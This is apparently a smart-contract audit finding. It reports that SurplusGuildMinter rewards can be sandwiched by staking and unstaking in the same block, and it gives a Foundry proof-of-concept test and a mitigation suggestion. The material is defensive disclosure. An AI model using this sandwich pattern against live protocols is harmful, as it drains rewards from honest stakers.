# SurplusGuildMinter - Rewards can be sandwiched #418
## Lines of code
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L114-L155
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L158-L212
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L328-L333

## Vulnerability details
### Impact
There exists no lockup period associated with staking to receive a portion of rewards during in the unstake() function

### Proof of Concept
A malicious actor may simply buy credit and then stake before the governor updates the reward using setRewardRatio() and unstake it in the same block thereby sandwiching the rewards and thereby cheating others that staked earlier.

Add this to SurplusGuildMinterUnitTest
```javascript
  function testUnstakeInSameBlock() public {
        // setup
        credit.mint(address(this), 150e18);
        credit.approve(address(sgm), 150e18);
        sgm.stake(term, 150e18);
        assertEq(credit.balanceOf(address(this)), 0);
        assertEq(profitManager.termSurplusBuffer(term), 150e18);
        assertEq(guild.balanceOf(address(sgm)), 300e18);
        assertEq(guild.getGaugeWeight(term), 350e18);
        assertEq(sgm.getUserStake(address(this), term).credit, 150e18);

        // the guild token earn interests
        vm.prank(governor);
        profitManager.setProfitSharingConfig(
            0.5e18, // surplusBufferSplit
            0, // creditSplit
            0.5e18, // guildSplit
            0, // otherSplit
            address(0) // otherRecipient
        );
        credit.mint(address(profitManager), 35e18);
        profitManager.notifyPnL(term, 35e18);
        assertEq(profitManager.surplusBuffer(), 17.5e18);
        assertEq(profitManager.termSurplusBuffer(term), 150e18);
        (,, uint256 rewardsThis) = profitManager.getPendingRewards(address(this));
        (,, uint256 rewardsSgm) = profitManager.getPendingRewards(address(sgm));
        assertEq(rewardsThis, 2.5e18);
        assertEq(rewardsSgm, 15e18);

        // unstake (sgm)
        sgm.unstake(term, 150e18);
        assertEq(credit.balanceOf(address(this)), 150e18 + rewardsSgm);
        assertEq(guild.balanceOf(address(this)), rewardsSgm * REWARD_RATIO / 1e18 + 50e18);
        assertEq(credit.balanceOf(address(sgm)), 0);
        assertEq(guild.balanceOf(address(sgm)), 0);
        assertEq(profitManager.surplusBuffer(), 17.5e18);
        assertEq(profitManager.termSurplusBuffer(term), 0);
        assertEq(guild.getGaugeWeight(term), 50e18);
        assertEq(sgm.getUserStake(address(this), term).credit, 0);

        // cannot unstake if nothing staked
        vm.expectRevert("SurplusGuildMinter: invalid amount");
        sgm.unstake(term, 1);
    }
```

From this poc it shows that a user can easily just stake and unstake immediately to claim rewards and sell immediately in the same block thereby cheating others that staked for a longer time 

## Tools Used
Manual Analysis

## Recommended Mitigation Steps
Consider implementing a staking/unstaking fee, lockup period or warmup fee

## Assessed type

Other
